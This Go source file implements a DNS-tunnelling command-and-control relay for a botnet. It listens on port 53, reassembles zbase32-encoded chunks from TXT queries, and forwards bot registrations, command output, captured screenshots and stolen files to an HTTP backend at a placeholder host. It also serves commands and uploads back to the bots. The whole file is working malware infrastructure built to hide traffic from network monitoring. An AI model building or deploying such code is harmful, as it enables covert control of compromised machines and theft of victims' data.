package main

import (
	"encoding/base64"
	"fmt"
	// "github.com/satori/go.uuid"
	// "bufio"
	"github.com/tonnerre/golang-dns"
	"github.com/tv42/zbase32"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	// "os"
	"encoding/json"
	"strconv"
	"strings"
	"sync"
	"time"
)

type Data struct {
	size        int
	name        string
	data        []string
	last_access time.Time
}

type UploadFile struct {
	count_part     int
	last_send_part int
	data           []string
	last_access    time.Time
}

type JsonFile struct {
	Data     string
	Filename string
}

var (
	dnsAddress    string = "your-site.com.com."
	host_port     string = "your-site.com"
	dataSeparator string = "."
	debugMode     bool   = true
	letterRunes          = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")

	registrationMutex  sync.Mutex
	OutputCommandMutex sync.Mutex
	DownloadFileMutex  sync.Mutex
	ScreenshotMutex    sync.Mutex
	UploadMutex        sync.Mutex

	ms_uniq_id     int = 0
	ms_type_op     int = 1
	ms_id          int = 2
	ms_name        int = 3
	ms_count_part  int = 4
	ms_number_part int = 5
	ms_data        int = 6

	mapRegistration  = map[string]*Data{}
	mapOutputCommand = map[string]*Data{}
	mapDownloadFile  = map[string]*Data{}
	mapScreenshot    = map[string]*Data{}
	mapUploadFile    = map[string]*UploadFile{}

	op_registration   int = 1
	op_get_command    int = 2
	op_output_command int = 3
	op_screenshot     int = 4
	op_download_file  int = 5
	op_upload_file    int = 6

	BAD_REQUEST string = "BAD_REQUEST"

	old_data_time = time.Minute * 3
)

const (
	POST_REQ string = "POST"
	GET_REQ  string = "GET"
)

func isValidReceivData(data []string) bool {
	lenghtData := len(data)
	if lenghtData <= ms_type_op {
		return false
	}

	op, err := strconv.Atoi(data[ms_type_op])
	if err != nil {
		return false
	}

	switch op {
	case op_get_command, op_upload_file:
		if len(data) != 3 {
			return false
		}
	default:
		if lenghtData < 7 {
			return false
		}
		_, err := strconv.Atoi(data[ms_count_part])
		if err != nil {
			return false
		}
		_, err = strconv.Atoi(data[ms_number_part])
		if err != nil {
			return false
		}
	}
	return true
}

func ClearOldData() {
	OutMessage("Clear old data")
	clearMap(mapRegistration, &registrationMutex)
	clearMap(mapOutputCommand, &OutputCommandMutex)
	clearMap(mapDownloadFile, &DownloadFileMutex)
	clearMap(mapScreenshot, &ScreenshotMutex)
	clearMapUploadFile(mapUploadFile, &UploadMutex)
}

func OutMessage(message string) {
	if debugMode && len(message) > 0 {
		fmt.Println(message)
	}
}

func clearMap(clearMap map[string]*Data, mutex *sync.Mutex) {
	mutex.Lock()
	for key, value := range clearMap {
		if time.Now().Local().Sub(value.last_access).Minutes() > old_data_time.Minutes() {
			OutMessage("delete" + key)
			delete(clearMap, key)
		}
	}
	mutex.Unlock()
}

func clearMapUploadFile(clearMap map[string]*UploadFile, mutex *sync.Mutex) {
	mutex.Lock()
	for key, value := range clearMap {
		if time.Now().Local().Sub(value.last_access).Minutes() > old_data_time.Minutes() {
			OutMessage("delete " + key)
			delete(mapUploadFile, key)
		}
	}
	mutex.Unlock()
}

func SendRequest(typeRequest, urlRequest string, data url.Values) (response *http.Response, err error) {
	var request *http.Request = nil

	if typeRequest == POST_REQ {
		request, err = http.NewRequest(typeRequest, urlRequest, strings.NewReader(data.Encode()))
		CheckError(err)
		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else if typeRequest == GET_REQ {
		request, err = http.NewRequest(typeRequest, urlRequest, nil)
		CheckError(err)
	}

	client := &http.Client{}
	response, err = client.Do(request)
	CheckError(err)
	return response, err
}

func UploadFileToBot(uuid string) (textResponse []byte) {
	UploadMutex.Lock()

	var uploadFile *UploadFile
	var flag bool

	if uploadFile, flag = mapUploadFile[uuid]; flag {
		textResponse = []byte(uploadFile.data[uploadFile.last_send_part])
		uploadFile.last_send_part++
		uploadFile.last_access = time.Now().Local()
		if uploadFile.last_send_part >= uploadFile.count_part {
			delete(mapUploadFile, uuid)
		}
	} else {
		responseServer, err := SendRequest(GET_REQ, "http://"+host_port+"/api/v1/upload/"+uuid, nil)
		CheckError(err)
		defer responseServer.Body.Close()
		text, err := ioutil.ReadAll(responseServer.Body)
		CheckError(err)
		if err == nil {
			var rJson JsonFile
			if ok, err := ParseJsonResponse(&rJson, text); ok {
				data := SplitDataPiece(rJson.Data, 253)
				uploadFile = new(UploadFile)
				uploadFile.data = data
				uploadFile.count_part = len(data)
				uploadFile.last_send_part = 0
				uploadFile.last_access = time.Now().Local()
				mapUploadFile[uuid] = uploadFile
				textResponse = []byte(rJson.Filename + "." + strconv.Itoa(uploadFile.count_part))
			} else {
				CheckError(err)
			}
		}
	}
	UploadMutex.Unlock()
	return textResponse
}

func SplitDataPiece(data string, size_piece int) (split_data []string) {
	lenght_data := len(data)
	if lenght_data > size_piece {
		pos := 0
		for pos < lenght_data {
			if (pos + size_piece) < lenght_data {
				split_data = append(split_data, data[pos:pos+size_piece])
				pos += size_piece
			} else {
				split_data = append(split_data, data[pos:lenght_data])
				pos += lenght_data - pos
			}
		}
	} else {
		split_data = append(split_data, data)
	}
	return split_data
}

func ProcessingData(urlWithData string) (textResponse []byte) {
	var responseServer *http.Response = nil
	var isDataReceived bool = false
	var sendData *Data
	var err error
	var typeOperation int

	receiveData := strings.Split(urlWithData, dataSeparator)
	offset := len(receiveData) - len(strings.Split(dnsAddress, dataSeparator))
	if !isValidReceivData(receiveData[0:offset]) {
		fmt.Println(BAD_REQUEST)
		return []byte(BAD_REQUEST)
	}

	typeOperation, err = strconv.Atoi(receiveData[ms_type_op])
	CheckError(err)

	switch typeOperation {
	case op_registration:
		if sendData, isDataReceived = ReceiveData(receiveData[0:offset], &registrationMutex, mapRegistration, typeOperation); isDataReceived {
			data, err := zbase32.DecodeString(joinToString(sendData.data))
			name, err := zbase32.DecodeString(sendData.name)
			CheckError(err)
			data_base64_escaped := url.QueryEscape(base64.StdEncoding.EncodeToString(data))
			name_base64_escaped := url.QueryEscape(base64.StdEncoding.EncodeToString(name))
			responseServer, err = SendRequest(GET_REQ, "http://"+host_port+"/api/v1/register/"+name_base64_escaped+"/"+data_base64_escaped, nil)
			CheckError(err)
			DeleteSendData(&registrationMutex, mapRegistration, receiveData[ms_id])
		}
	case op_get_command:
		responseServer, err = http.Get("http://" + host_port + "/api/v1/get_command/" + receiveData[ms_id])
		isDataReceived = true
		CheckError(err)
	case op_output_command:
		if sendData, isDataReceived = ReceiveData(receiveData[0:offset], &OutputCommandMutex, mapOutputCommand, typeOperation); isDataReceived {
			data, _ := zbase32.DecodeString(joinToString(sendData.data))
			command, _ := zbase32.DecodeString(sendData.name)
			data_base64 := base64.StdEncoding.EncodeToString(data)
			command_base64 := base64.StdEncoding.EncodeToString(command)
			postData := url.Values{"command": {command_base64}, "output": {data_base64}}
			responseServer, err = SendRequest(POST_REQ, "http://"+host_port+"/api/v1/output_command/"+receiveData[ms_id], postData)
			CheckError(err)
			DeleteSendData(&OutputCommandMutex, mapOutputCommand, receiveData[ms_id])
		}
	case op_screenshot:
		if sendData, isDataReceived = ReceiveData(receiveData[0:offset], &ScreenshotMutex, mapScreenshot, typeOperation); isDataReceived {
			data, err := zbase32.DecodeString(joinToString(sendData.data))
			CheckError(err)
			data_base64 := base64.StdEncoding.EncodeToString(data)
			postData := url.Values{"data": {data_base64}}
			responseServer, err = SendRequest(POST_REQ, "http://"+host_port+"/api/v1/screenshot/"+receiveData[ms_id], postData)
			CheckError(err)
			DeleteSendData(&ScreenshotMutex, mapScreenshot, receiveData[ms_id])
		}
	case op_download_file:
		if sendData, isDataReceived = ReceiveData(receiveData[0:offset], &DownloadFileMutex, mapDownloadFile, typeOperation); isDataReceived {
			name, err := zbase32.DecodeString(sendData.name)
			CheckError(err)
			data, err := zbase32.DecodeString(joinToString(sendData.data))
			CheckError(err)
			name_base64_escaped := base64.StdEncoding.EncodeToString(name)
			data_base64_escaped := base64.StdEncoding.EncodeToString(data)
			postData := url.Values{"filename": {name_base64_escaped}, "data": {data_base64_escaped}}
			responseServer, err = SendRequest(POST_REQ, "http://"+host_port+"/api/v1/download/"+receiveData[ms_id], postData)
			CheckError(err)
			DeleteSendData(&DownloadFileMutex, mapDownloadFile, receiveData[ms_id])
		}
	case op_upload_file:
		textResponse = UploadFileToBot(receiveData[ms_id])
		return textResponse
	}

	if isDataReceived && responseServer != nil {
		defer responseServer.Body.Close()
		textResponse, _ = ioutil.ReadAll(responseServer.Body)
	} else {
		textResponse = []byte("")
	}
	return textResponse
}

func ReceiveData(receiveData []string, mutex *sync.Mutex, storageData map[string]*Data, typeOperation int) (fillData *Data, dataReceived bool) {
	mutex.Lock()

	var data *Data = nil
	var flag bool
	var err error
	var number_part int

	number_part, err = strconv.Atoi(receiveData[ms_number_part])
	CheckError(err)

	if data, flag = storageData[receiveData[ms_id]]; flag {
		data.data[number_part] = joinToString(receiveData[ms_data:len(receiveData)])
		data.last_access = time.Now().Local()
	} else {
		data = new(Data)
		data.last_access = time.Now().Local()
		data.name = receiveData[ms_name]
		data.size, err = strconv.Atoi(receiveData[ms_count_part])
		CheckError(err)
		data.data = make([]string, data.size)
		data.data[number_part] = joinToString(receiveData[ms_data:len(receiveData)])
		storageData[receiveData[ms_id]] = data
	}
	mutex.Unlock()

	if data.size == number_part+1 {
		return data, true
	} else {
		return data, false
	}
}

func DeleteSendData(mutex *sync.Mutex, storageData map[string]*Data, id string) {
	mutex.Lock()
	delete(storageData, id)
	mutex.Unlock()
}

func HandlerRequest(w dns.ResponseWriter, req *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(req)

	if req.Question[0].Qtype != dns.TypeTXT {
		var rr dns.RR
		rr = new(dns.A)
		rr.(*dns.A).Hdr = dns.RR_Header{Name: m.Question[0].Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 3600}
		m.Answer = append(m.Answer, rr)
		w.WriteMsg(m)
		return
	}

	textResponse := ProcessingData(req.Question[0].Name)
	if debugMode && len(textResponse) > 0 && len(textResponse) < 100 {
		fmt.Println("Resp_cl = " + string(textResponse))
	}

	var response []string
	if len(textResponse) > 253 {
		pos := 0
		for pos < len(textResponse) {
			if (pos + 253) < len(textResponse) {
				response = append(response, string(textResponse[pos:pos+253]))
				pos += 253
			} else {
				response = append(response, string(textResponse[pos:len(textResponse)]))
				pos += len(textResponse) - pos
			}
		}
	} else {
		response = append(response, string(textResponse))
	}

	newTXT := new(dns.TXT)
	newTXT.Hdr = dns.RR_Header{Name: m.Question[0].Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 3600}
	newTXT.Txt = response
	m.Answer = append(m.Answer, newTXT)
	w.WriteMsg(m)
}

func main() {
	ticker := time.NewTicker(time.Minute * 4)
	go func() {
		for {
			ClearOldData()
			<-ticker.C
		}
	}()

	dns.HandleFunc(dnsAddress, HandlerRequest)
	err := dns.ListenAndServe(":53", "udp", nil)
	if err != nil {
		fmt.Println(err)
	}
}

func joinToString(data []string) string {
	var info string
	for index := range data {
		info += data[index]
	}
	return info
}

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func CheckError(err error) {
	if err != nil && debugMode {
		fmt.Println(err.Error())
	}
}

func ParseJsonResponse(jsonStruct interface{}, parseStr []byte) (bool, error) {
	err := json.Unmarshal(parseStr, jsonStruct)
	if err == nil {
		return true, err
	} else {
		return false, err
	}
}
